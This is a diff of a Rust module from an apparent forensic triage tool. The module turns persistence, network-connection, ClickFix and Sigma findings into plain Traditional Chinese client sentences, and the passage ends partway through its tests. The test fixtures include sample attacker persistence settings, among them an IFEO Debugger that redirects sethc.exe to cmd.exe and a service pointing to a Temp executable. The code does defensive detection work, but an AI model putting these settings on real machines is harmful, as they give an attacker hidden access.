@@ -1,20 +1,29 @@
 //! FR18: plain zh-TW client-facing text for Findings >= Medium severity.
 //!
-//! `fill_details_client` fills `Finding.details_client` with a one-sentence
-//! summary addressed to a non-technical audience. It is idempotent when the
-//! severity is below Medium (Low / Info) — it simply returns without touching
-//! the field.
+//! All client wording for heuristic findings lives here, chosen from typed fields —
+//! `Finding.analyzer` (which analyzer produced it) and, for persistence findings,
+//! `entity.persistence.mechanism` — never by parsing the title or reason. Analyzers
+//! produce technical facts; this module turns them into client sentences.
 //!
-//! R3: `entity_name()` reads registry data/value/key so persistence findings
-//!     never say "未知程式" when registry context is available.
-//! R4: mechanism-aware zh-TW templates for persistence findings (service,
-//!     run_key, startup, scheduled_task, winlogon, ifeo).
-//! R5: netconn client text includes the owning process name when available.
+//! Exception: `heur_eventlog` still writes its own per-event `details_client` (each
+//! event ID has its own sentence built from event fields the Finding does not carry
+//! in structured form); a heuristic finding that arrives with text already set keeps
+//! it.
+//!
+//! `fill_details_client` is a no-op below Medium. It takes the run time from the
+//! caller (the manifest's start time) so the "N 天前新增" hints are reproducible and
+//! the report never depends on the wall clock at write time.
 #![forbid(unsafe_code)]
 
 use chrono::{DateTime, Duration, Utc};
 
+use cairn_core::analyzers;
 use cairn_core::finding::{Finding, FindingSource, Severity};
+use cairn_core::Mechanism;
+
+fn is_high(s: Severity) -> bool {
+    matches!(s, Severity::Critical | Severity::High)
+}
 
 fn is_medium_or_above(s: Severity) -> bool {
     matches!(s, Severity::Critical | Severity::High | Severity::Medium)
@@ -58,7 +67,7 @@ fn entity_name(f: &Finding) -> String {
     "未知程式".to_owned()
 }
 
-/// Human-readable relative-time hint derived from a registry last-write time.
+/// Human-readable relative-time hint derived from a last-write time.
 fn timing_hint(last_write: Option<DateTime<Utc>>, now: DateTime<Utc>) -> String {
     match last_write {
         Some(lw) => {
@@ -73,57 +82,116 @@ fn timing_hint(last_write: Option<DateTime<Utc>>, now: DateTime<Utc>) -> String 
     }
 }
 
-/// Mechanism-specific zh-TW sentence for persistence findings.
-///
-/// The mechanism is the suffix of `f.title` after `"Suspicious persistence: "`.
-fn persistence_client_text(host: &str, f: &Finding) -> String {
-    let now = Utc::now();
+/// Plain zh-TW name of each persistence mechanism, for the generic template.
+fn mechanism_label(m: Mechanism) -> &'static str {
+    match m {
+        Mechanism::RunKey => "登錄檔自動啟動（Run 機碼）",
+        Mechanism::Service => "系統服務",
+        Mechanism::ScheduledTask => "排程工作",
+        Mechanism::WmiSubscription => "WMI 事件訂閱",
+        Mechanism::Ifeo => "IFEO 偵錯程式設定",
+        Mechanism::Startup => "啟動資料夾",
+        Mechanism::Winlogon => "Winlogon 登入設定",
+        Mechanism::ExplorerPolicyRun => "群組原則自動執行",
+        Mechanism::BootExecute => "開機前執行程式（BootExecute）",
+        Mechanism::LsaAuthPackage => "LSA 驗證套件",
+        Mechanism::LsaSecurityPackage => "LSA 安全性套件",
+        Mechanism::LsaNotificationPackage => "密碼篩選器",
+        Mechanism::TimeProvider => "時間提供者",
+        Mechanism::WinlogonNotify => "Winlogon 通知套件",
+        Mechanism::WinlogonMpnotify => "Winlogon MPNotify 程式",
+        Mechanism::PrintMonitor => "列印監視器",
+        Mechanism::ActiveSetup => "Active Setup",
+        Mechanism::Screensaver => "螢幕保護程式",
+        Mechanism::NetshHelper => "netsh 輔助 DLL",
+        Mechanism::AppcertDlls => "AppCertDlls",
+        Mechanism::AppinitDlls => "AppInit_DLLs",
+        Mechanism::SilentExitMonitor => "程式結束監視（SilentProcessExit）",
+        Mechanism::ComHijack => "COM 元件登錄",
+        Mechanism::CmdAutorun => "命令提示字元 AutoRun",
+        Mechanism::OfficeTest => "Office Test 機碼",
+        Mechanism::LogonScript => "使用者登入腳本",
+        Mechanism::PsProfile => "PowerShell 設定檔",
+        Mechanism::Other => "自動執行設定",
+    }
+}
+
+/// Mechanism-specific zh-TW sentence for a heur_persist finding.
+fn persistence_client_text(host: &str, f: &Finding, now: DateTime<Utc>) -> String {
     let reg = f.entity.registry.as_ref();
+    let file = f.entity.file.as_ref();
     let bin = reg
+        .filter(|r| !r.data.trim().is_empty())
         .map(|r| short_name(r.data.trim_matches('"')))
+        .or_else(|| file.map(|fi| short_name(&fi.path)))
         .unwrap_or_else(|| entity_name(f));
-    let svc_name = reg
+    let key_leaf = reg
         .and_then(|r| r.key.rsplit('\\').next().map(str::to_owned))
+        .filter(|s| !s.is_empty())
         .unwrap_or_else(|| entity_name(f));
-    let timing = timing_hint(reg.and_then(|r| r.last_write), now);
-    let value_name = reg.map(|r| r.value.as_str()).unwrap_or("?");
+    let value_name = reg
+        .map(|r| r.value.as_str())
+        .filter(|v| !v.is_empty())
+        .unwrap_or("?");
+    let timing = timing_hint(
+        reg.and_then(|r| r.last_write)
+            .or_else(|| file.and_then(|fi| fi.mtime)),
+        now,
+    );
 
-    let mechanism = f
-        .title
-        .strip_prefix("Suspicious persistence: ")
-        .unwrap_or("unknown");
-
+    let Some(mechanism) = f.entity.persistence.as_ref().map(|p| p.mechanism) else {
+        return format!(
+            "主機 {host} 上，{} 疑似建立了持久化機制（{timing}），建議確認該項目是否為已知且授權的軟體。",
+            entity_name(f)
+        );
+    };
     match mechanism {
-        "service" => format!(
-            "主機 {} 上偵測到服務 {} 指向 {}（{}），建議確認是否為已知且授權的軟體。",
-            host, svc_name, bin, timing
+        Mechanism::Service => format!(
+            "主機 {host} 上偵測到服務 {key_leaf} 指向 {bin}（{timing}），建議確認是否為已知且授權的軟體。"
         ),
-        "run_key" | "startup" => format!(
-            "主機 {} 上，{} 在自動啟動項目中新增了 {}（{}），建議確認是否為已知且授權的操作。",
-            host, svc_name, bin, timing
+        Mechanism::RunKey => format!(
+            "主機 {host} 上，自動啟動項目「{value_name}」會在登入時執行 {bin}（{timing}），建議確認是否為已知且授權的操作。"
         ),
-        "scheduled_task" => format!(
-            "主機 {} 上偵測到排程工作 {} 指向 {}（{}），建議確認是否為已知且授權的操作。",
-            host, svc_name, bin, timing
+        Mechanism::Startup => format!(
+            "主機 {host} 上，啟動資料夾中的 {bin} 會在登入時自動執行（{timing}），建議確認是否為已知且授權的操作。"
         ),
-        "winlogon" => format!(
-            "主機 {} 上，Winlogon {} 設定為 {}（{}），若非預期值請立即調查。",
-            host, value_name, bin, timing
+        Mechanism::ScheduledTask => format!(
+            "主機 {host} 上偵測到排程工作 {key_leaf} 指向 {bin}（{timing}），建議確認是否為已知且授權的操作。"
         ),
-        "ifeo" => format!(
-            "主機 {} 上，{} 的 IFEO Debugger 被設定為 {}，此手法幾乎僅用於攻擊，建議立即調查。",
-            host, svc_name, bin
+        Mechanism::Winlogon => format!(
+            "主機 {host} 上，Winlogon {value_name} 設定為 {bin}（{timing}），若非預期值請立即調查。"
         ),
-        _ => format!(
-            "主機 {} 上，{} 疑似建立了持久化機制（{}），建議確認該項目是否為已知且授權的軟體。",
-            host,
-            entity_name(f),
-            timing
+        Mechanism::Ifeo if is_high(f.severity) => format!(
+            "主機 {host} 上，{key_leaf} 的 IFEO Debugger 被設定為 {bin}，此手法幾乎僅用於攻擊，建議立即調查。"
+        ),
+        Mechanism::Ifeo => format!(
+            "主機 {host} 上，{key_leaf} 的 IFEO Debugger 被設定為 {bin}（{timing}）。部分偵錯或系統工具\
+             （例如以 Process Explorer 取代工作管理員）也會這樣設定，但攻擊者也會用它攔截程式啟動；\
+             建議確認是否為已知且授權的設定。"
+        ),
+        Mechanism::WmiSubscription => format!(
+            "主機 {host} 上偵測到 WMI 事件訂閱 {value_name}，會在特定事件發生時自動執行指令或腳本；\
+             一般電腦很少有這類設定，建議立即調查。"
+        ),
+        Mechanism::PsProfile if is_high(f.severity) => format!(
+            "主機 {host} 上的 PowerShell 設定檔 {bin} 會在每次開啟 PowerShell 時執行，\
+             內容含有下載或編碼指令，建議立即調查。"
+        ),
+        Mechanism::PsProfile => format!(
+            "主機 {host} 上的 PowerShell 設定檔 {bin} 會在每次開啟 PowerShell 時執行，\
+             內容含有網址（未見下載或編碼指令）。這可能只是代理伺服器或模組來源設定，\
+             建議確認內容是否為使用者或 IT 自行加入。"
+        ),
+        other => format!(
+            "主機 {host} 上，{bin} 透過「{}」設定為自動執行（{timing}），建議確認該項目是否為已知且授權的軟體。",
+            mechanism_label(other)
         ),
     }
 }
 
-/// zh-TW sentence for network-connection findings, naming the owning process.
+/// zh-TW sentence for network-connection findings, naming the owning process and the
+/// direction: an outbound connection, an inbound session to an exposed remote-access
+/// service (netconn tags those T1133), or a listening socket.
 fn netconn_client_text(host: &str, f: &Finding) -> String {
     let proc_name = f
         .entity
@@ -143,60 +211,197 @@ fn netconn_client_text(host: &str, f: &Finding) -> String {
             )
         })
         .unwrap_or_else(|| "未知目標".to_owned());
+    let conn = f.entity.netconn.as_ref();
+    let listening = conn.is_some_and(|c| {
+        c.rport.unwrap_or(0) == 0
+            || c.raddr
+                .as_deref()
+                .is_none_or(|r| matches!(r, "" | "0.0.0.0" | "::" | "*" | "-"))
+    });
+    let inbound = f.mitre.iter().any(|m| m == "T1133");
+    if listening {
+        let lport = conn.map(|c| c.lport).unwrap_or(0);
+        return format!(
+            "主機 {host} 上，{proc_name} 正在監聽連接埠 {lport}，等待外部連入，\
+             建議確認這個程式是否應該對外提供服務。"
+        );
+    }
+    if inbound {
+        let lport = conn.map(|c| c.lport).unwrap_or(0);
+        return format!(
+            "主機 {host} 上，有來自 {remote} 的外部連線連入本機連接埠 {lport}（由 {proc_name} 接收），\
+             代表這項遠端服務直接暴露在網際網路上；建議確認連線來源是否為已知人員，並評估是否應關閉對外存取。"
+        );
+    }
     format!(
         "主機 {} 上，{} 發起了對外連線至 {}，建議確認連線目標是否屬於正常業務範疇。",
         host, proc_name, remote
     )
 }
 
-pub fn fill_details_client(f: &mut Finding) {
+/// zh-TW sentence for a ClickFix Run-dialog finding: the typed command is the
+/// registry value data.
+fn clickfix_client_text(f: &Finding) -> String {
+    let typed = f
+        .entity
+        .registry
+        .as_ref()
+        .map(|r| r.data.as_str())
+        .unwrap_or("-");
+    format!(
+        "有人在這台主機的「執行」對話框（Win+R）輸入了：{typed}。\
+         假驗證碼或假錯誤頁面常要使用者貼上這類指令來下載惡意程式（ClickFix 手法）；\
+         請詢問使用者當時看到什麼畫面，並檢查這個指令下載或執行了什麼。"
+    )
+}
+
+/// The Sigma level a finding was raised at (its severity, lowercase: "high", ...).
+fn level(f: &Finding) -> &'static str {
+    match f.severity {
+        Severity::Critical => "critical",
+        Severity::High => "high",
+        Severity::Medium => "medium",
+        Severity::Low => "low",
+        Severity::Info => "informational",
+    }
+}
+
+/// The matched event as "Security EID 4688 record 42" (whatever parts are known).
+fn matched_event(f: &Finding) -> String {
+    let mut parts = vec![f
+        .artifact
+        .strip_prefix("evtx:")
+        .unwrap_or(&f.artifact)
+        .to_string()];
+    if let Some(eid) = f.event_id {
+        parts.push(format!("EID {eid}"));
+    }
+    let record = format!("record {}", f.evidence_ref.as_deref().unwrap_or("?"));
+    // A flood merged into one finding (cairn-heur sigma `aggregate`) lists each hit as
+    // evidence; naming only the first record would read as a single event.
+    let hits = f.evidence.iter().filter(|e| e.ts.is_some()).count();
+    if f.source == FindingSource::Sigma && hits > 1 {
+        parts.push(format!("共多筆（列於佐證來源），第一筆 {record}"));
+    } else {
+        parts.push(record);
+    }
+    parts.join(" ")
+}
+
+/// zh-TW heading of a host-inventory (observation) category, with the category key
+/// kept in brackets so analysts can still filter on it. Chosen from the typed
+/// category constants and the persistence `Mechanism` names; an unknown category is
+/// shown as is.
+pub fn observation_category_label(category: &str) -> String {
+    let label = match category {
+        cairn_core::observation::CATEGORY_SERVICE_INSTALL => {
+            "新安裝的服務與驅動程式（位於只有系統管理員能寫入的資料夾、沒有可疑跡象，列出供核對）"
+                .to_string()
+        }
+        cairn_core::observation::CATEGORY_LOGGING_POSTURE => "記錄設定與偵測盲點".to_string(),
+        "winlogon_default" => "Winlogon 預設登入設定".to_string(),
+        other => {
+            match serde_json::from_value::<Mechanism>(serde_json::Value::String(other.into())) {
+                Ok(m) if m.as_str() == other => format!("自動執行項目：{}", mechanism_label(m)),
+                _ => return other.to_string(),
+            }
+        }
+    };
+    format!("{label}（{category}）")
+}
+
+/// zh-TW "why" line for a Sigma finding: rule title, rule author (DRL 1.1 requires
+/// surfacing it), level, and the matched event record. `None` for heuristics, which
+/// carry their own `reason`. The Sigma engine itself sets no reason; this is the
+/// report-side explanation built from the finding's typed fields.
+pub fn sigma_rule_line(f: &Finding) -> Option<String> {
+    (f.source == FindingSource::Sigma).then(|| {
+        format!(
+            "Sigma 規則「{}」（作者：{}；等級：{}；比對事件：{}）",
+            f.title,
+            f.rule_author.as_deref().unwrap_or("未標示"),
+            level(f),
+            matched_event(f)
+        )
+    })
+}
+
+/// zh-TW name of a logging setting a Sigma rule needs, phrased as what to turn on.
+pub fn logging_requirement_text(r: cairn_core::observation::LoggingRequirement) -> &'static str {
+    use cairn_core::observation::LoggingRequirement as R;
+    match r {
+        R::ProcessCreationAudit => "稽核「行程建立」（4688，預設關閉）",
+        R::CommandLineIn4688 => "在行程建立事件中包含命令列（預設關閉）",
+        R::ScriptBlockLogging => "PowerShell 指令碼區塊記錄（4104，預設關閉）",
+        R::ModuleLogging => "PowerShell 模組記錄（4103，預設關閉）",
+        R::Sysmon => "安裝 Sysmon（規則用到只有 Sysmon 才記錄的欄位或事件）",
+        R::LogonAudit => "稽核「登入」（預設開啟）",
+        R::UserAccountManagementAudit => "稽核「使用者帳戶管理」（預設開啟）",
+        R::SecurityGroupManagementAudit => "稽核「安全性群組管理」（預設開啟）",
+        R::OtherObjectAccessAudit => "稽核「其他物件存取事件」（排程工作，預設關閉）",
+        R::SecuritySystemExtensionAudit => "稽核「安全性系統延伸」（4697 服務安裝，預設關閉）",
+        R::FileShareAudit => "稽核「檔案共用」（5140，預設關閉）",
+        R::DetailedFileShareAudit => "稽核「詳細檔案共用」（5145，預設關閉）",
+        R::ObjectAccessSacl => "物件存取稽核加上目標的 SACL（4656/4663，預設關閉）",
+        R::NtlmAudit => "NTLM 稽核記錄（預設關閉）",
+        R::DomainController => "只有網域控制站才會產生的事件",
+        R::TaskSchedulerLog => "工作排程器操作記錄（用戶端預設停用）",
+        R::OtherAuditPolicy => "對應的安全性稽核原則（cairn 無法判斷是哪一項）",
+        R::UnmappedLogsource => "cairn 不認得這條規則的記錄來源",
+    }
+}
+
+/// English equivalent for the timeline's Reason column when the finding has none.
+pub fn sigma_reason(f: &Finding) -> Option<String> {
+    (f.source == FindingSource::Sigma).then(|| {
+        format!(
+            "sigma rule '{}' by {} (level {}) matched {}",
+            f.title,
+            f.rule_author.as_deref().unwrap_or("unknown author"),
+            level(f),
+            matched_event(f)
+        )
+    })
+}
+
+/// Fill `details_client` for a Medium+ finding. `now` is the run's reference time
+/// (manifest `run.started_utc`).
+pub fn fill_details_client(f: &mut Finding, now: DateTime<Utc>) {
     if !is_medium_or_above(f.severity) {
+        return;
+    }
+    // An analyzer that wrote its own event-specific text knows more than the generic
+    // per-analyzer templates below; keep it.
+    if f.source == FindingSource::Heuristic && f.details_client.is_some() {
         return;
     }
     let host = f.host.clone();
     let text = match f.source {
-        FindingSource::Heuristic => match f.artifact.as_str() {
-            "process" => {
-                let name = entity_name(f);
-                format!(
-                    "主機 {} 上，{} 以非預期的父行程方式執行，\
-                     可能為偽裝或橫向移動，建議確認該執行是否屬於正常業務操作。",
-                    host, name
-                )
-            }
-            "no_execution_artifact" => {
-                let name = entity_name(f);
-                format!(
-                    "主機 {} 上，{} 正在執行，但在既有執行紀錄（prefetch/amcache/\
-                     shimcache）中皆查無記錄，建議確認該程式的來源與執行原因（此現象\
-                     不代表程式必為惡意，也可能是紀錄機制本身的涵蓋缺口）。",
-                    host, name
-                )
-            }
-            "persistence" => persistence_client_text(&host, f),
-            "netconn" => netconn_client_text(&host, f),
-            "file_meta" => {
-                let name = entity_name(f);
-                format!(
-                    "主機 {} 上，{} 的時間戳記疑似遭到竄改，\
-                     建議進一步確認該檔案的真實建立時間。",
-                    host, name
-                )
-            }
+        FindingSource::Heuristic => match f.analyzer.as_str() {
+            analyzers::PARENTCHILD => format!(
+                "主機 {} 上，{} 以非預期的父行程方式執行，\
+                 可能為偽裝或橫向移動，建議確認該執行是否屬於正常業務操作。",
+                host,
+                entity_name(f)
+            ),
+            analyzers::PERSIST => persistence_client_text(&host, f, now),
+            analyzers::NETCONN => netconn_client_text(&host, f),
+            analyzers::CLICKFIX => clickfix_client_text(f),
             _ => format!("主機 {} 上偵測到疑似異常行為，建議分析師確認詳情。", host),
         },
         FindingSource::Sigma => {
             let title = f.title.clone();
+            let basis = sigma_rule_line(f).unwrap_or_default();
             match f.severity {
                 Severity::Critical | Severity::High => format!(
                     "主機 {} 上偵測到與「{}」相關的可疑活動，\
-                     此類活動具有較高風險，建議盡速進行調查。",
-                    host, title
+                     此類活動具有較高風險，建議盡速進行調查。偵測依據：{}。",
+                    host, title, basis
                 ),
                 _ => format!(
                     "主機 {} 上偵測到與「{}」相關的活動，\
-                     建議分析師評估是否為授權操作。",
-                    host, title
+                     建議分析師評估是否為授權操作。偵測依據：{}。",
+                    host, title, basis
                 ),
             }
         }
@@ -207,14 +412,20 @@ pub fn fill_details_client(f: &mut Finding) {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use cairn_core::finding::{
-        EntityNetConn, EntityProcess, EntityRegistry, Finding, FindingSource, Severity,
-    };
+    use cairn_core::finding::{EntityNetConn, EntityProcess, Finding, FindingSource, Severity};
+    use cairn_core::record::{PersistenceRecord, Record, RegValueRecord};
+    use cairn_core::traits::Analyzer;
+    use chrono::TimeZone;
 
-    fn make_heuristic(severity: Severity, artifact: &str) -> Finding {
+    /// Fixed run time: client text must not depend on the wall clock.
+    fn run_time() -> DateTime<Utc> {
+        Utc.with_ymd_and_hms(2026, 10, 20, 12, 0, 0).unwrap()
+    }
+
+    fn make_heuristic(severity: Severity, analyzer: &str) -> Finding {
         let mut f = Finding::new(severity, "test", FindingSource::Heuristic);
         f.host = "WS01".into();
-        f.artifact = artifact.into();
+        f.analyzer = analyzer.into();
         f.entity.process = Some(EntityProcess {
             pid: 1,
             ppid: 0,
@@ -232,60 +443,79 @@ mod tests {
         f
     }
 
+    fn prec(
+        mechanism: Mechanism,
+        location: &str,
+        value: Option<&str>,
+        command: &str,
+        signed: Option<bool>,
+        last_write: Option<DateTime<Utc>>,
+    ) -> PersistenceRecord {
+        PersistenceRecord {
+            mechanism,
+            location: location.into(),
+            value: value.map(String::from),
+            command: Some(command.into()),
+            binary_path: Some(command.trim_matches('"').into()),
+            binary_sha256: None,
+            signed,
+            signer: None,
+            last_write,
+            bound: None,
+            signer_source: None,
+            service_start: None,
+        }
+    }
+
+    /// Run the REAL persistence analyzer and fill client text on its single finding —
+    /// the test exercises the title/entity shape production actually emits.
+    fn persist_text(p: PersistenceRecord) -> String {
+        let findings = cairn_heur::PersistHeuristic
+            .analyze(&[Record::Persistence(p)], &[])
+            .unwrap();
+        assert_eq!(findings.len(), 1, "fixture must gate exactly one finding");
+        let mut f = findings.into_iter().next().unwrap();
+        assert!(
+            !f.title.starts_with("Suspicious persistence: "),
+            "real titles are '<label>: <name>': {}",
+            f.title
+        );
+        f.host = "WS01".into();
+        fill_details_client(&mut f, run_time());
+        f.details_client
+            .expect("persist findings here are >= Medium")
+    }
+
+    #[test]
+    fn heuristic_supplied_text_is_kept() {
+        let mut f = make_heuristic(Severity::High, analyzers::EVENTLOG);
+        f.details_client = Some("自訂說明".into());
+        fill_details_client(&mut f, run_time());
+        assert_eq!(f.details_client.as_deref(), Some("自訂說明"));
+    }
+
     #[test]
     fn parent_child_heuristic_filled() {
-        let mut f = make_heuristic(Severity::High, "process");
-        fill_details_client(&mut f);
+        let mut f = make_heuristic(Severity::High, analyzers::PARENTCHILD);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.expect("must be Some for High");
         assert!(text.contains("非預期的父行程"), "got: {text}");
         assert!(text.contains("WS01"), "host missing: {text}");
         assert!(text.contains("cmd.exe"), "path missing: {text}");
     }
 
-    /// heur_live_exec's signal A must get its own honest client text, not the
-    /// parentchild "unexpected parent process" sentence — regression for the
-    /// "process" artifact string collision caught in final review.
-    #[test]
-    fn live_exec_no_artifact_heuristic_filled() {
-        let mut f = make_heuristic(Severity::High, "no_execution_artifact");
-        fill_details_client(&mut f);
-        let text = f.details_client.expect("must be Some for High");
-        assert!(text.contains("查無記錄"), "got: {text}");
-        assert!(
-            !text.contains("父行程"),
-            "must not reuse parentchild's wording: {text}"
-        );
-        assert!(text.contains("WS01"), "host missing: {text}");
-    }
-
-    #[test]
-    fn persist_heuristic_filled() {
-        let mut f = make_heuristic(Severity::Medium, "persistence");
-        fill_details_client(&mut f);
-        let text = f.details_client.expect("must be Some for Medium");
-        assert!(text.contains("持久化機制"), "got: {text}");
-    }
-
     #[test]
     fn netconn_heuristic_filled() {
-        let mut f = make_heuristic(Severity::High, "netconn");
-        fill_details_client(&mut f);
+        let mut f = make_heuristic(Severity::High, analyzers::NETCONN);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.expect("must be Some for High");
         assert!(text.contains("對外連線"), "got: {text}");
     }
 
     #[test]
-    fn timestomp_heuristic_filled() {
-        let mut f = make_heuristic(Severity::High, "file_meta");
-        fill_details_client(&mut f);
-        let text = f.details_client.expect("must be Some for High");
-        assert!(text.contains("時間戳記疑似遭到竄改"), "got: {text}");
-    }
-
-    #[test]
     fn other_heuristic_filled() {
-        let mut f = make_heuristic(Severity::Medium, "unknown_artifact");
-        fill_details_client(&mut f);
+        let mut f = make_heuristic(Severity::Medium, "heur_unknown");
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.expect("must be Some for Medium");
         assert!(text.contains("疑似異常行為"), "got: {text}");
     }
@@ -293,7 +523,7 @@ mod tests {
     #[test]
     fn sigma_high_filled() {
         let mut f = make_sigma(Severity::High, "Mimikatz Credential Dumping");
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.expect("must be Some for High");
         assert!(text.contains("較高風險"), "got: {text}");
         assert!(
@@ -302,10 +532,36 @@ mod tests {
         );
     }
 
+    /// Sigma client text names the rule, its DRL author, the level and the record.
+    #[test]
+    fn sigma_text_carries_title_author_level_and_record() {
+        let mut f = make_sigma(Severity::High, "Mimikatz Credential Dumping");
+        f.rule_author = Some("Florian Roth".into());
+        f.artifact = "evtx:Security".into();
+        f.event_id = Some(4688);
+        f.evidence_ref = Some("4242".into());
+        fill_details_client(&mut f, run_time());
+        let text = f.details_client.clone().unwrap();
+        for want in [
+            "Florian Roth",
+            "等級：high",
+            "Security EID 4688 record 4242",
+        ] {
+            assert!(text.contains(want), "{want} missing: {text}");
+        }
+        let line = sigma_rule_line(&f).unwrap();
+        assert!(line.contains("Mimikatz Credential Dumping"));
+        let reason = sigma_reason(&f).unwrap();
+        assert!(reason.contains("by Florian Roth") && reason.contains("record 4242"));
+        // Heuristics carry their own reason.
+        let h = make_heuristic(Severity::High, analyzers::PARENTCHILD);
+        assert!(sigma_rule_line(&h).is_none() && sigma_reason(&h).is_none());
+    }
+
     #[test]
     fn sigma_medium_filled() {
         let mut f = make_sigma(Severity::Medium, "Suspicious PowerShell");
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.expect("must be Some for Medium");
         assert!(text.contains("評估是否為授權操作"), "got: {text}");
     }
@@ -313,135 +569,203 @@ mod tests {
     #[test]
     fn low_severity_not_filled() {
         let mut f = make_sigma(Severity::Low, "Low Noise Rule");
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         assert!(f.details_client.is_none(), "Low must remain None");
 
-        let mut f2 = make_heuristic(Severity::Info, "process");
-        fill_details_client(&mut f2);
+        let mut f2 = make_heuristic(Severity::Info, analyzers::PARENTCHILD);
+        fill_details_client(&mut f2, run_time());
         assert!(f2.details_client.is_none(), "Info must remain None");
     }
 
     #[test]
     fn entity_path_falls_back_to_unknown_when_no_entity() {
-        let mut f = make_heuristic(Severity::High, "process");
+        let mut f = make_heuristic(Severity::High, analyzers::PARENTCHILD);
         f.entity.process = None;
-        fill_details_client(&mut f);
+        fill_details_client(&mut f, run_time());
         let text = f.details_client.unwrap();
         assert!(text.contains("未知程式"), "fallback path missing: {text}");
     }
 
-    // ── R3: registry entity → entity_name uses registry data/value/key ──────
+    // ── persistence: real PersistHeuristic findings, mechanism-specific text ──
 
+    /// Regression: client text used to strip "Suspicious persistence: " from the
+    /// title, but real titles are "<zh label>: <name>", so every real finding fell
+    /// into the generic template. A real service finding now names service + binary.
     #[test]
-    fn service_client_text_not_unknown() {
-        let mut f = Finding::new(
-            Severity::Medium,
-            "Suspicious persistence: service",
-            FindingSource::Heuristic,
-        );
-        f.host = "WS01".into();
-        f.artifact = "persistence".into();
-        f.entity.registry = Some(EntityRegistry {
-            hive: "HKLM".into(),
-            key: r"HKLM\SYSTEM\CurrentControlSet\Services\CoworkVMService".into(),
-            value: "CoworkVMService".into(),
-            data: r#""C:\Program Files\WindowsApps\Claude\cowork-svc.exe""#.into(),
-            last_write: None,
-        });
-        fill_details_client(&mut f);
-        let text = f.details_client.unwrap();
-        assert!(!text.contains("未知程式"), "must not say 未知程式: {text}");
+    fn real_service_finding_gets_service_text_with_binary_and_host() {
+        let text = persist_text(prec(
+            Mechanism::Service,
+            r"HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc",
+            Some("EvilSvc"),
+            r"C:\Users\x\AppData\Local\Temp\evil.exe",
+            Some(false),
+            Some(run_time() - Duration::days(2)),
+        ));
+        assert!(text.contains("服務 EvilSvc"), "{text}");
+        assert!(text.contains("evil.exe"), "{text}");
+        assert!(text.contains("WS01"), "{text}");
         assert!(
-            text.contains("cowork-svc.exe") || text.contains("CoworkVMService"),
-            "must mention name or binary: {text}"
+            text.contains("2天前新增"),
+            "uses the given run time: {text}"
         );
-    }
-
-    // ── R4: service with recent last_write includes binary name and host ─────
-
-    #[test]
-    fn service_client_text_includes_binary_and_host() {
-        let now = Utc::now();
-        let recent = now - Duration::days(2);
-        let mut f = Finding::new(
-            Severity::Medium,
-            "Suspicious persistence: service",
-            FindingSource::Heuristic,
-        );
-        f.host = "WS01".into();
-        f.artifact = "persistence".into();
-        f.entity.registry = Some(EntityRegistry {
-            hive: "HKLM".into(),
-            key: r"HKLM\SYSTEM\CurrentControlSet\Services\EvilSvc".into(),
-            value: "EvilSvc".into(),
-            data: r"C:\Users\x\AppData\Local\Temp\evil.exe".into(),
-            last_write: Some(recent),
-        });
-        fill_details_client(&mut f);
-        let text = f.details_client.unwrap();
-        assert!(text.contains("evil.exe"), "must name binary: {text}");
-        assert!(text.contains("WS01"), "must name host: {text}");
-    }
-
-    // ── R4: IFEO text warns about attack technique ───────────────────────────
-
-    #[test]
-    fn ifeo_client_text_mentions_attack() {
-        let mut f = Finding::new(
-            Severity::High,
-            "Suspicious persistence: ifeo",
-            FindingSource::Heuristic,
-        );
-        f.host = "WS01".into();
-        f.artifact = "persistence".into();
-        f.entity.registry = Some(EntityRegistry {
-            hive: "HKLM".into(),
-            key: r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe".into(),
-            value: "Debugger".into(),
-            data: r"C:\Temp\cmd.exe".into(),
-            last_write: None,
-        });
-        fill_details_client(&mut f);
-        let text = f.details_client.unwrap();
         assert!(
-            text.contains("幾乎僅用於攻擊") || text.contains("調查"),
-            "IFEO text must mention attack context: {text}"
+            !text.contains("持久化機制"),
+            "not the generic template: {text}"
         );
     }
-
-    // ── R4: winlogon text mentions the value name ────────────────────────────
 
     #[test]
-    fn winlogon_client_text_mentions_value() {
-        let mut f = Finding::new(
-            Severity::Medium,
-            "Suspicious persistence: winlogon",
-            FindingSource::Heuristic,
-        );
-        f.host = "WS01".into();
-        f.artifact = "persistence".into();
-        f.entity.registry = Some(EntityRegistry {
-            hive: "HKLM".into(),
-            key: r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon".into(),
-            value: "Shell".into(),
-            data: "explorer.exe".into(),
-            last_write: None,
-        });
-        fill_details_client(&mut f);
-        let text = f.details_client.unwrap();
-        assert!(
-            text.contains("Shell") || text.contains("Winlogon"),
-            "winlogon text must mention value: {text}"
-        );
+    fn real_run_key_finding_names_value_and_binary() {
+        let text = persist_text(prec(
+            Mechanism::RunKey,
+            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
+            Some("Updater"),
+            r"C:\Users\x\AppData\Roaming\upd.exe",
+            Some(false),
+            None,
+        ));
+        assert!(text.contains("自動啟動項目「Updater」"), "{text}");
+        assert!(text.contains("upd.exe"), "{text}");
+        assert!(text.contains("時間不明"), "{text}");
     }
 
-    // ── R5: netconn with owning process names the process ────────────────────
+    #[test]
+    fn real_ifeo_finding_warns_about_attack() {
+        let text = persist_text(prec(
+            Mechanism::Ifeo,
+            r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe",
+            Some("sethc.exe"),
+            r"C:\Temp\cmd.exe",
+            None,
+            None,
+        ));
+        assert!(text.contains("sethc.exe 的 IFEO Debugger"), "{text}");
+        assert!(text.contains("幾乎僅用於攻擊"), "{text}");
+    }
+
+    /// Process Explorer replacing Task Manager is the textbook benign IFEO Debugger;
+    /// whatever severity persist gives it, the text must match that severity.
+    #[test]
+    fn ifeo_text_is_graded_by_severity() {
+        let findings = cairn_heur::PersistHeuristic
+            .analyze(
+                &[Record::Persistence(prec(
+                    Mechanism::Ifeo,
+                    r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe",
+                    Some("taskmgr.exe"),
